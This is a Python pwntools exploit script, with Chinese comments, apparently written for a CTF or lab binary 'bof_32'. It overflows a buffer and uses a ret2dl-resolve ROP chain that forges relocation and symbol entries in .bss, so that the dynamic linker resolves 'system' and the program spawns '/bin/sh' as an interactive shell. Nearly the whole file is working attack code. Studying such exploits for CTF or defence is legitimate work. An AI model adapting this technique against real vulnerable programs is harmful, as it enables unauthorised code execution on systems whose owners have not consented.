#coding:utf-8
from pwn import *

context.log_level='debug'
io = process('./bof_32')
e = ELF('./bof_32')

# readelf -S bof_32
relplt_addr = e.get_section_by_name('.rel.plt')['sh_addr'] 
plt_addr = e.get_section_by_name('.plt')['sh_addr']
dynsym_addr = e.get_section_by_name('.dynsym')['sh_addr']
dynstr_addr = e.get_section_by_name('.dynstr')['sh_addr']
gnuver_addr = e.get_section_by_name('.gnu.version')['sh_addr']

bss_addr = e.bss()
pop3ret = 0x804858d

# 相对于.rel.plt的偏移，单位字节
reloc_offset = bss_addr +8 - relplt_addr # 8字节让出来放/bin/sh

# 构造rop向bss中写入数据，并调用.plt，即_dl_runtime_resolve
buf = 'a'*8
buf += p32(e.plt['read']) + p32(pop3ret) + p32(0) + p32(bss_addr) + p32(0x100)
buf += p32(plt_addr)  # 即_dl_runtime_resolve
buf += p32(reloc_offset) # 之后会自动平衡并调用解析出来的函数。
buf += p32(0xdead) # 之后函数的返回地址
#buf += p32(1)  
buf += p32(bss_addr) # 参数
#buf += p32(0x8)

io.sendline(buf)
io.recv(4)

fake_sym_addr = bss_addr + 16 # 前面占用了16字节
index_dynsym   = (fake_sym_addr - dynsym_addr) / 0x10 + 1 # 对齐并加1 

# 向后寻找使Elf_Verneed为0的index_dynsym，否则会出错
verneed_addr = gnuver_addr + index_dynsym * 2  
tmp = e.read(verneed_addr ,2)
while(tmp!='\x00'*2):
    index_dynsym += 1
    verneed_addr = gnuver_addr + index_dynsym * 2
    tmp = e.read(verneed_addr ,2)

log.info('index_dynsym=%#x'% index_dynsym)

# 根据新的index_dynsym计算padding和fake_sym_addr
padding = index_dynsym * 0x10 + dynsym_addr - fake_sym_addr
fake_sym_addr = index_dynsym * 0x10 + dynsym_addr

# 后三位必须是7
rinfo = (index_dynsym << 8) | 0x7
log.info('rinfo=%#x'% rinfo)

# 伪造的reloc结构 .rel.plt
buf2 = '/bin/sh\x00'
buf2 +=  p32(e.got['write'])  # got.plt offset
buf2 += p32(rinfo) # rinfo

buf2 += 'a'*padding
# 此处地址即为fake_sym_addr
# 伪造的sym结构  
st_name = fake_sym_addr - dynstr_addr + 16
buf2 += p32(st_name) # st_name
buf2 += p32(0) + p32(0) + p32(0x12) # 硬编码

#buf2 += 'write\x00'
buf2 += 'system\x00' # st_name

#gdb.attach(io)
io.sendline(buf2)

io.interactive()
